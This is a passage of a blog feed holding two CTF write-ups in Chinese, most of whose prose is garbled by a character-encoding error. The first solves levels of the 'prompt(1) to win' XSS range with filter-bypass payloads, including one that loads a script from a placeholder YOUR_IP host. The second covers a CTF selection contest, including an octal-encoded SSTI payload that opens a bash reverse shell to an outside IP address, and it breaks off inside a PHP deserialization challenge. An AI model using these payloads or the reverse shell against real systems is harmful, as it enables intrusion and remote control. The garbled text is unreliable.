å…¥åå¯è½¬æ¢ä¸ºç›¸ä¼¼çš„ <code>S</code> ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å¼€å§‹çš„ <code>replace</code>ã€‚</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Å¿cript src&#x3D;&quot;YOUR_IP&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line">    <span class="comment">// â”¬â”€â”€â”¬ ï»¿ãƒ( ã‚œ-ã‚œãƒ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ /(.â–¡. \ï¼‰DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³æ¯”è¾ƒç®€å•ï¼Œå°±æŠŠå•å¼•å·æ›¿æ¢ä¸ºç©ºï¼Œåªè¦åœ¨ <code>prompt(1)</code> ä¸­é—´åŠ ä¸ªå•å¼•å·å°±è¡Œäº†ã€‚</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro&#39;mpt(1)</span><br></pre></td></tr></table></figure><hr><h2 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">&#x27;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &#x27;</span> + memberName + <span class="string">&#x27;.&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly &quot;parse&quot; data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = &#x27;</span> + dataString + <span class="string">&#x27;;          \n\</span></span><br><span class="line"><span class="string">    if (data.action === &quot;login&quot;)            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å° trick ï¼Œåˆ©ç”¨å­—æ¯æ“ä½œç¬¦æ„é€  <code>(prompt(1)) in &quot;.&quot;</code> ï¼Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä»å¯ä»¥å¼¹çª—ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817171942102.png"></p><p>ç”±äº js å®šä¹‰å¯¹è±¡æ—¶åŒä¸€å±æ€§åçš„ä¼šå…ˆå–åé¢çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ª trick å®ç° XSSã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817172250539.png"></p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure><hr><h2 id="0xC"><a href="#0xC" class="headerlink" title="0xC"></a>0xC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ãƒâ”¬â”€â”¬ãƒ ï¸µ ( \oÂ°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³ç”¨åˆ°ä¸‰ä¸ªå‡½æ•°ã€‚</p><blockquote><p>parseInt() // å¯ä»¥å°†å­—ç¬¦ä¸²é€šè¿‡è¿›åˆ¶è½¬æ¢ä¸ºæ•°å­—</p><p>toString() // å¯ä»¥å°†æ•°å­—é€šè¿‡è¿›åˆ¶è½¬æ¢å›å­—ç¬¦ä¸²</p><p>eval() // å¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œæ­£å¸¸è¯­å¥æ‰§è¡Œ</p></blockquote><p>ç›´æ¥ç»™å‡ºæµ‹è¯•</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817173413085.png"></p><p>payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(630038579..toString(30))(1) &#x3D;&#x3D;&gt; prompt(1)</span><br></pre></td></tr></table></figure><hr><h2 id="0xD"><a href="#0xD" class="headerlink" title="0xD"></a>0xD</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">&#x27;http://placehold.it/350x150&#x27;</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off &quot;</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#x27;</span>.replace(<span class="string">&#x27;&#123;&#123;source&#125;&#125;&#x27;</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid image data.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³æœ‰ä¸¤ä¸ªçŸ¥è¯†ç‚¹</p><ul><li><p>js å¯¹è±¡çš„é»˜è®¤å±æ€§ <code>__proto__</code></p></li><li><p>js çš„ replace å­—ç¬¦ä¸²ç‰¹æ®Šæ›¿æ¢æ¨¡å¼</p><p>é¦–å…ˆæ˜¯ js å¯¹è±¡çš„é»˜è®¤å±æ€§</p></li></ul><blockquote><p>æ¯ä¸ªå¯¹è±¡éƒ½ä¼šåœ¨å…¶å†…éƒ¨åˆå§‹åŒ–ä¸€ä¸ªå±æ€§ï¼Œå°±æ˜¯<code>__proto__</code>ï¼Œå½“æˆ‘ä»¬è®¿é—®å¯¹è±¡çš„å±æ€§æ—¶ï¼Œå¦‚æœå¯¹è±¡å†…éƒ¨ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆå°±ä¼šå»<code>__proto__</code>é‡Œé¢æ‰¾è¿™ä¸ªå±æ€§ï¼Œè¿™ä¸ª<code>__proto__</code>åˆä¼šæœ‰è‡ªå·±çš„<code>__proto__</code>ï¼Œä¸€ç›´è¿™æ ·æ‰¾ä¸‹å»ã€‚</p></blockquote><p>ä¸Šæµ‹è¯•ï¼ï¼</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817200920171.png"></p><p>æ‰€ä»¥å½“é¢˜ç›® <code>delete config.source</code>æ—¶ï¼Œåé¢ç”¨åˆ°çš„ <code>config.source</code>  å°±æ˜¯ <code>__proto__</code> å±æ€§é‡Œçš„ï¼Œè¿™æ ·å°±å¯æ§äº†ã€‚</p><p>ç„¶åæ˜¯ js çš„ replace å­—ç¬¦ä¸²ç‰¹æ®Šæ›¿æ¢æ¨¡å¼ï¼Œä¸»è¦çœ‹è¿™ä¸ªï¼Œæˆ–è€…<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description">ç›´æ¥å»ç½‘ç«™çœ‹</a>ã€‚</p><table><thead><tr><th align="left">Pattern</th><th align="left">Inserts</th></tr></thead><tbody><tr><td align="left"><strong>$$</strong></td><td align="left">Inserts a <code>&quot;$&quot;</code>.</td></tr><tr><td align="left"><strong>$&amp;</strong></td><td align="left">Inserts the matched substring.</td></tr><tr><td align="left"><strong>$`</strong></td><td align="left">Inserts the portion of the string that precedes the matched substring.</td></tr><tr><td align="left"><strong>$â€˜</strong></td><td align="left">Inserts the portion of the string that follows the matched substring.</td></tr><tr><td align="left"><strong>$n</strong></td><td align="left">Where <code>n</code> is a positive integer less than 100, inserts the <code>n</code>th parenthesized submatch string, provided the first argument was a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp"><code>RegExp</code></a> object. Note that this is <code>1</code>-indexed. If a group <code>n</code> is not present (e.g., if group is 3), it will be replaced as a literal (e.g., <code>$3</code>).</td></tr><tr><td align="left"><strong>$&lt;Name&gt;</strong></td><td align="left">Where <code>Name</code> is a capturing group name. If the group is not in the match, or not in the regular expression, or if a string was passed as the first argument to <code>replace</code> instead of a regular expression, this resolves to a literal (e.g., <code>$&lt;Name&gt;</code>). Only available in browser versions supporting named capturing groups.</td></tr></tbody></table><p>ç›´æ¥ä¸Šæµ‹è¯•æ¯”è¾ƒå¥½ç†è§£ç‚¹ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210817201818379.png"></p><p>è¿™æ ·å°±å¯ä»¥åšåˆ°æ—¢ä¿ç•™äº† <code>&lt;img</code> æ ‡ç­¾ï¼Œåˆå¯ä»¥æ§åˆ¶è¾“å…¥ï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°XSSäº†ã€‚</p><p>ç›´æ¥ä¸Špayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&#123;&#125;,&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#96;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="0xE"><a href="#0xE" class="headerlink" title="0xE"></a>0xE</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">&#x27;data:&#x27;</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª replace æ˜¯å°† <code>//</code> æˆ– <code>(ä»»æ„å­—æ¯æ•°å­—):</code> æ›¿æ¢ä¸º <code>data:</code>ã€‚</p><p>ç¬¬äºŒä¸ª replace æ˜¯å°† <strong>\</strong> ã€ <strong>&amp;</strong> ã€<strong>+</strong> ã€<strong>%</strong> å’Œç©ºç™½å­—ç¬¦æ›¿æ¢ä¸º _____ ã€‚</p><p>åˆå› ä¸ºæœ‰ toUpperCase() åœ¨ï¼Œæ‰€ä»¥æ³¨å…¥ XSS æ˜¯ä¸å¤§å¥½æçš„ï¼Œå°è¯•å¼•ç”¨å¤–éƒ¨è„šæœ¬ã€‚</p><p>å°è¯•äº†ä¸‹ï¼ŒæŠŠæˆ‘è‡ªå·±çš„æœåŠ¡å™¨æ”¾ä¸Šå»æ‹¿ä¸åˆ°å…¨å¤§å†™å­—æ¯åŠ æ•°å­—çš„ base64 ç¼–ç ï¼Œå°±å…ˆæ”¾ payload åœ¨è¿™äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME&#x2F;SRC&#x3D;&quot;x:text&#x2F;html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4&#x3D;</span><br></pre></td></tr></table></figure><hr><h2 id="0xF"><a href="#0xF" class="headerlink" title="0xF"></a>0xF</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;    </span><br><span class="line"><span class="comment">// sort of spoiler of level 7    </span></span><br><span class="line">input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">&#x27;&#x27;</span>);    </span><br><span class="line"><span class="comment">// pass in something like dog#cat#bird#mouse...    </span></span><br><span class="line"><span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;        </span><br><span class="line"><span class="comment">// title can only contain 15 characters        </span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">&#x27;&quot; data-comment=\&#x27;&#123;&quot;id&quot;:&#x27;</span> + index + <span class="string">&#x27;&#125;\&#x27;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å…³è™½ç„¶æŠŠ <code>*</code> æ›¿æ¢æ‰äº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ <code>&lt;svg&gt;</code> æ ‡ç­¾å»ä½¿ç”¨ <code>&lt;!-- --&gt;</code>æ›¿ä»£å¤šè¡Œæ³¨é‡Šã€‚</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;);&lt;!--#--&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;&quot;&gt;&lt;svg&gt;&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:0&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;&lt;script&gt;&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:1&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;prompt(1&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:2&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;);&lt;!--&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:3&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;comment&quot; title&#x3D;&quot;--&gt;&lt;&#x2F;script&gt;&quot; data-comment&#x3D;&#39;&#123;&quot;id&quot;:4&#125;&#39;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>å†™å®Œè¿™ä¸ªé¶åœºç®—æ˜¯å¤šäº†è§£äº†ç‚¹ XSS(æœ‰ç‚¹åˆšå­¦ RCEçš„æ„Ÿè§‰Â¿</p><p>ä½†æ˜¯æ„Ÿè§‰æ¥è§¦çš„è¿˜ä¸å¤Ÿï¼Œåªæ˜¯äº›ç»•è¿‡è¿‡æ»¤ä»€ä¹ˆçš„ï¼Œæœ€ä¸»è¦çš„åˆ©ç”¨ æ‹¿shell å¼¹shell? åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œç›®å‰è¿˜æ²¡é‡åˆ°è¿‡ï¼Œè¿˜æ˜¯å¾—å¤šç»ƒç»ƒã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;prompt-1-to-win-XSSé¶åœºç»ƒä¹ &quot;&gt;&lt;a href=&quot;#prompt-1-to-win-XSSé¶åœºç»ƒä¹ &quot; class=&quot;headerlink&quot; title=&quot;prompt(1) to win - XSSé¶åœºç»ƒä¹ &quot;&gt;&lt;/a&gt;prompt(1) to w</summary>
      
    
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
    <category term="XSS" scheme="https://lucifer-rossweisse.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬äº”å±ŠXMané€‰æ‹”èµ›</title>
    <link href="https://lucifer-rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/"/>
    <id>https://lucifer-rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/</id>
    <published>2021-08-07T11:28:59.000Z</published>
    <updated>2021-08-07T11:30:27.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>åŸºç¡€é¢˜</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806120716307.png"></p><blockquote><p>flag{you_are_great!!!}</p></blockquote><h2 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a>easyssti</h2><h3 id="sstiå¼¹shell"><a href="#sstiå¼¹shell" class="headerlink" title="sstiå¼¹shell"></a>sstiå¼¹shell</h3><p>sstiï¼Œä¸»è¦è€ƒç‚¹æ˜¯å¦‚ä½•é—­åˆã€‚</p><p>æµ‹è¯•å‘ç°<code>&#123;%print(1)%&#125;</code>æˆåŠŸè¿”å›ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806120923584.png"></p><p>__globals__æŸ¥çœ‹å½“å‰ä½ç½®çš„å…¨éƒ¨æ¨¡å—ï¼Œæ–¹æ³•å’Œå…¨å±€å˜é‡ã€‚</p><blockquote><p>name=%7B%25print((lipsum|attr(â€œ__globals__â€œ)))%25%7D</p></blockquote><p>values()æŸ¥æ‰¾å¯åˆ©ç”¨æ¨¡å—ã€‚</p><blockquote><p>name=%7B%25print((lipsum|attr(â€œ__globals__â€œ)).values()[18].values()[134])%25%7D</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806121618333.png"></p><p>åˆ©ç”¨evalå¼¹shellï¼Œä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%7B%25print((lipsum|attr(<span class="string">&quot;__globals__&quot;</span>)).values()[<span class="number">18</span>].values()[<span class="number">134</span>](<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\142\141\163\150\40\55\143\40\42\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\61\66\56\66\62\56\62\64\63\56\62\63\61\57\61\62\63\64\40\60\76\46\61\42\47\51\56\162\141\145\144\50\51&quot;</span>))%<span class="number">25</span>%7D</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806130713332.png"></p><p>æ‹¿åˆ°flag</p><blockquote><p>flag{zPkb3tzUW8m0KuSfPoPqgSU37I4ui2hZ}</p></blockquote><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h3><p>é¢˜ç›®ç›´æ¥ç»™å‡ºæºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 